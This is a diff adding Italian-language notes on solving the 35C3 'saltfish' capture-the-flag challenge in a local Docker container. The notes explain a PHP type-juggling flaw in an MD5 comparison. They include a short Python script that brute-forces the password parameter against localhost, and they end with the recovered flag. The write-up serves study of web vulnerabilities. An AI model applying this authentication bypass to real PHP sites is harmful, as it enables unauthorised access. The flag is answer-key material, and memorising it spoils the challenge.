@@ -1,0 +1,16 @@
+TEORIA: type juggling=il tipo della variabile dipende dalla variabile inserita
+1. $ cd "/c/Users/Andre/Documents/saltfish"
+2. $ chmod -R +rx ./
+3. $ docker build -t cpp/saltfish .
+4. $ docker run -d -p "127.0.0.1:9000:80" --name "saltfish" "cpp/saltfish"
+5. http://127.0.0.1:9000, Basta un solo carattere ($_[0]), Il resto della stringa non conta, Il primo confronto funziona per qualsiasi lettera perché PHP trasforma MD5 + lettera in 0 (type juggling), Quindi il vero “test” è solo il terzo if.
+Devo solo trovare il primo carattere c tale che: c == md5(c + flag)[0]
+6. crea un solve.py su vscode: 	import requests 
+				import string 
+
+				for i in string.ascii_letters: 
+    					url = f"http://127.0.0.1:9000/?pass={i}" 
+    					r = requests.get(url, headers={'User-Agent': str(i)}) 
+    					print(r.text) 
+7. eseguilo 
+8. risultato 35c3_password_saltf1sh_30_seconds_max
